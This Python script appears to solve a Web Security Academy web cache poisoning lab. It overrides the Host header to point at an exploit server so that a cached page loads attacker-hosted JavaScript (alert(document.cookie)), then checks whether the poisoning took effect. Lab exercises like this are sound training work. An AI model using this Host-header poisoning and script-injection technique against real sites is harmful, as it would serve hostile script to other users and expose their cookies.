import http.client
import re
import ssl

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_(
        query: str | None = None,
        _lab: str | None = None,
        header: tuple[str, str] | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    if query:
        path = f'{path}?{query}'
    host, port = f'{LAB_ID}.h1-web-security-academy.net', 443
    headers = {
        'Host': f'{LAB_ID}.h1-web-security-academy.net',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    if _lab:
        headers['Cookie'] = f'_lab={_lab}'
    if header:
        headers[header[0]] = header[1]
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def lab_cookie() -> str:
    response = GET_(query='abc=x')
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'_lab=([%a-zA-Z0-9]+);', cookie_header)[0]


print("Exploit:")
print("File:")
print("/resources/js/tracking.js")
print("Head:")
print("""HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8""")
print("Body:")
print("""alert(document.cookie)""")
input("set up exploit and hit enter")
print()

url = f'exploit-{EXPLOIT_SERVER_ID}.exploit-server.net'
response = GET_(header=('host', url), _lab=lab_cookie())
if response.headers['x-cache'] == 'hit':
    print(f'cache hit. age: {response.headers["age"]}')
    exit(1)
print(response.status)
for name, header in response.headers.items():
    print(f"{name}: {header}")
response_body = response.read().decode()
print(response_body)
print()
print(f"{url}/resources/js/tracking.js" in response_body)
